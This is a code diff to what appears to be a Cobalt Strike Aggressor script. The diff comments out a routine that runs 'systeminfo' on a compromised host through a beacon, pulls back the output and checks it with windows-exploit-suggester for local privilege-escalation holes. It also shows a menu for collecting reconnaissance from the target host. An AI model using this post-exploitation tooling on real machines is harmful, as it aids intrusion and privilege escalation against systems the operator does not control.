@@ -101,37 +101,37 @@ sub main{
     }
 }
 
-sub audit{
-    $bid = $1['@'];
-    $fname = beacon_info($bid,"computer")."-info.txt";
-    $lpath = script_resource("temp\\ $+ $fname");
-    $suggester = script_resource("local\\windows-exploit-suggester.py");
-    $db = script_resource("local\\2020-04-10-mssb.xls");
-    $audit_fname = script_resource("logs\\".beacon_info($bid,"computer")."-audit.txt");
-    bshell($bid,"systeminfo >  $+ $fname");
-    bdownload($bid, $fname);
-    #sleep(3 * 1000);
-    foreach %item (downloads()){
-            if (%item['name'] eq $fname){
-                $rpath = %item['lpath'];
-                sync_download($rpath, $lpath);
-            }
-        } 
-    #sleep(3 * 1000);
-    if (-exists $lpath){
-        $cmd = $suggester." -i  $+ $lpath  -d  $+ $db";
-        $process = exec("cmd.exe /c ".$cmd);
-        @data = readAll($process);
-        $out = openf(">" . $audit_fname); 
-        foreach $line (@data){
-            writeb($out, $line."\r\n");
-        }         
-        closef($out);
-        closef($process);
-        deleteFile(replace($fname, "\\\\", "/"));
-        exec("cmd.exe /c start ".script_resource("logs\\"));
-        }
-    }
+# sub audit{
+#     $bid = $1['@'];
+#     $fname = beacon_info($bid,"computer")."-info.txt";
+#     $lpath = script_resource("temp\\ $+ $fname");
+#     $suggester = script_resource("local\\windows-exploit-suggester.py");
+#     $db = script_resource("local\\2020-04-10-mssb.xls");
+#     $audit_fname = script_resource("logs\\".beacon_info($bid,"computer")."-audit.txt");
+#     bshell($bid,"systeminfo >  $+ $fname");
+#     bdownload($bid, $fname);
+#     #sleep(3 * 1000);
+#     foreach %item (downloads()){
+#             if (%item['name'] eq $fname){
+#                 $rpath = %item['lpath'];
+#                 sync_download($rpath, $lpath);
+#             }
+#         } 
+#     #sleep(3 * 1000);
+#     if (-exists $lpath){
+#         $cmd = $suggester." -i  $+ $lpath  -d  $+ $db";
+#         $process = exec("cmd.exe /c ".$cmd);
+#         @data = readAll($process);
+#         $out = openf(">" . $audit_fname); 
+#         foreach $line (@data){
+#             writeb($out, $line."\r\n");
+#         }         
+#         closef($out);
+#         closef($process);
+#         deleteFile(replace($fname, "\\\\", "/"));
+#         exec("cmd.exe /c start ".script_resource("logs\\"));
+#         }
+#     }
 
 
 #append menus
@@ -144,7 +144,7 @@ sub audit{
             dialog_description($dialog, "Collect information about the target host");
             drow_checkbox($dialog, "sysinfo", "System informations", "");
             drow_checkbox($dialog, "ipconfig", "Network card configuration information", "");
-            drow_checkbox($dialog, "netstat", "Listening port list", "");
+            drow_checkbox($dialog, "netstat", "Listening TCP port list", "");
             drow_checkbox($dialog, "software", "Installed software list", "");
             drow_checkbox($dialog, "ps_soft", "Installed software list(use powershell)", "");
             drow_checkbox($dialog, "runprocs", "Startup processes list", "");
@@ -163,7 +163,7 @@ sub audit{
             dialog_show($dialog);
         }
 
-        item "Audit available lpe vulnerability"{
-            audit($1);
-        }
+        # item "Audit available lpe vulnerability"{
+        #     audit($1);
+        # }
     }
